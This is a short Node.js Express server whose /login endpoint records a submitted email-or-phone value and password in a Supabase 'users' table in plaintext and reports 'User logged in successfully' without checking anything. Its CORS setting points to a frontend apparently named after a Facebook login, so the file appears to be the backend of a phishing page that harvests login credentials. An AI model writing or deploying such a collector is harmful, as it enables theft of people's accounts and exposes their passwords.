const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const { createClient } = require('@supabase/supabase-js'); // Import Supabase client

const app = express();

// Middleware
app.use(
  cors({
    origin: ['https://fb-login-frontend.vercel.app'], // Frontend production URL
    methods: 'GET,HEAD,PATCH,POST,PUT,DELETE',
  })
);
app.use(bodyParser.json());

// Supabase configuration
const supabaseUrl = process.env.SUPABASE_URL; // Supabase API URL from environment variables
const supabaseKey = process.env.SUPABASE_KEY; // Supabase API Key from environment variables
const supabase = createClient(supabaseUrl, supabaseKey); // Initialize Supabase client

// API endpoint to handle login
app.post('/login', async (req, res) => {
  const { emailOrPhone, password } = req.body; // Extract user credentials from request body

  try {
    // Insert user data into Supabase
    const { data, error } = await supabase.from('users').insert([
      { emailOrPhone, password },
    ]);

    if (error) {
      console.error('Supabase error:', error);
      return res.status(500).json({ error: 'Error saving user data.' });
    }

    res.status(200).json({ message: 'User logged in successfully', data });
  } catch (err) {
    console.error('Server error:', err);
    res.status(500).send('Error saving user data.');
  }
});

// Start the server
const port = process.env.PORT || 5000;
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
